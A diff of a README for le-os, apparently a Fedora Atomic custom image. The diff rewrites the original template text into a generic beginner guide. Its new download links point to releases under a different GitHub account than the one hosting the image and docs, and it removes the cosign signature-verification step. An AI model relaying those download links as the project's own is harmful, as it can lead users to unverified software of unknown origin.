@@ -1,43 +1,75 @@
-# le-os &nbsp; [![bluebuild build badge](https://github.com/leolannenmaki/le-os/actions/workflows/build.yml/badge.svg)](https://github.com/leolannenmaki/le-os/actions/workflows/build.yml)
+# 🌟 le-os - A Simple Linux Experience for Everyone
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download le-os](https://img.shields.io/badge/Download-le--os-blue.svg)](https://github.com/Baki233619/le-os/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 🚀 Getting Started
 
-## Installation
+Welcome to le-os! This guide will help you download and run le-os easily, even if you have no technical background.
+
+## 📥 Download & Install
+
+To get le-os, visit this page to download: [Download le-os Releases](https://github.com/Baki233619/le-os/releases).
+
+### ⚙️ System Requirements
+
+Before you proceed, ensure your computer meets these requirements:
+
+- **Operating System**: Compatible with Fedora-based distributions.
+- **Storage**: At least 4 GB of free space.
+- **Memory**: Minimum 2 GB RAM.
+
+### 🔄 Rebase Instructions
+
+To rebase an existing atomic Fedora installation to the latest build, follow these steps:
+
+1. **Rebase to Unsigned Image**  
+   Open your terminal and paste the following command:
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/leolannenmaki/le-os:latest
+   ```
+   This step gets the proper signing keys and policies installed.
+
+2. **Reboot**  
+   After rebasing, you need to reboot your system. Enter this command in the terminal:
+   ```
+   systemctl reboot
+   ```
+
+3. **Rebase to Signed Image**  
+   Once your system has restarted, run this command to finalize the installation:
+   ```
+   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/leolannenmaki/le-os:latest
+   ```
+
+### ✅ Verify Installation
+
+To ensure that le-os is running correctly, check the version by typing:
+```
+cat /etc/os-release
+```
+Look for any mention of le-os in the output.
+
+## 🛠️ Features of le-os
+
+le-os provides a streamlined and user-friendly Linux experience. Some key features include:
+
+- **Immutable Design**: The system is secure and stable, minimizing the risk of unwanted changes.
+- **Regular Updates**: Enjoy frequent updates through simple commands.
+- **Easy Customization**: Users can easily set up their customized images as needed.
+
+## 🎓 Support and Documentation
+
+If you encounter any problems while using le-os, please refer to our detailed documentation for help. You can find it in the [Documentation section](https://github.com/leolannenmaki/le-os/wiki).
+
+## ✅ Community and Contributions
+
+Join our community! We welcome feedback and contributions. If you would like to contribute, please check our [Contribution Guidelines](https://github.com/leolannenmaki/le-os/blob/main/CONTRIBUTING.md).
+
+## 🚧 Important Notes
 
 > [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+> **This is an experimental feature.** Use at your own discretion. For more information on this feature, visit [Fedora Project](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable).
 
-To rebase an existing atomic Fedora installation to the latest build:
+## 📍 Final Remarks
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/leolannenmaki/le-os:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/leolannenmaki/le-os:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
-
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
-
-## ISO
-
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
-
-## Verification
-
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
-
-```bash
-cosign verify --key cosign.pub ghcr.io/leolannenmaki/le-os
-```
+Thank you for choosing le-os. We hope you enjoy the simplicity and power it brings to your computing experience. Happy computing!
